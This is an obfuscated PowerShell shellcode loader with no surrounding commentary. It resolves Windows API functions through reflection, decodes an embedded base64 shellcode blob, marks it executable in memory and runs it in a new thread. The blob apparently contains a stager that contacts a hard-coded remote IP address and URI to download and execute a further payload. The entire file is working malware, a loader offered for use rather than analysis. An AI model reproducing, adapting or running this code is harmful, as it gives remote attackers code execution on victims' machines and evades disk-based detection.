function ivnO {
        Param ($xws2, $hKX)
        $jv = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $jv.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($jv.GetMethod('GetModuleHandle')).Invoke($null, @($xws2)))), $hKX))
}

function tyQ {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $vlJt,
                [Parameter(Position = 1)] [Type] $cU1 = [Void]
        )

        $yt = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $yt.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $vlJt).SetImplementationFlags('Runtime, Managed')
        $yt.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $cU1, $vlJt).SetImplementationFlags('Runtime, Managed')

        return $yt.CreateType()
}

[Byte[]]$zkEe_ = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSUVZlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGFBEi0AgSQHQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheWUgB0FpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6A8AAAAxNzEuMjUuMjIyLjIwNABaSInBScfAuwEAAE0xyVNTagNTSbpXiZ/GAAAAAP/V6DgAAAAvMnVnNFBuZTlkcnIxeXZUSWxMMEpJd3dIN0o0NklYSzlMR2xKdEo0dUU0TmxydDFONjk3Rk13AEiJwVNaQVhNMclTSLgAMqiEAAAAAFBTU0nHwutVLjv/1UiJxmoKX0iJ8WofWlJogDMAAEmJ4GoEQVlJunVGnoYAAAAA/9VNMcBTWkiJ8U0xyU0xyVNTScfCLQYYe//VhcB1H0jHwYgTAABJukTwNeAAAAAA/9VI/890Auuq6FUAAABTWWpAWkmJ0cHiEEnHwAAQAABJulikU+UAAAAA/9VIk1NTSInnSInxSInaScfAACAAAEmJ+Um6EpaJ4gAAAAD/1UiDxCCFwHSyZosHSAHDhcB10ljDWGoAWUnHwvC1olb/1Q==")
[Uint32]$vW = 0
$ndn = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ivnO kernel32.dll VirtualAlloc), (tyQ @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $zkEe_.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($zkEe_, 0, $ndn, $zkEe_.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ivnO kernel32.dll VirtualProtect), (tyQ @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($ndn, [Uint32]$zkEe_.Length, 0x10, [Ref]$vW)) -eq $true) {
        $iCzb_ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ivnO kernel32.dll CreateThread), (tyQ @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$ndn,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ivnO kernel32.dll WaitForSingleObject), (tyQ @([IntPtr], [Int32]))).Invoke($iCzb_,0xffffffff) | Out-Null
}
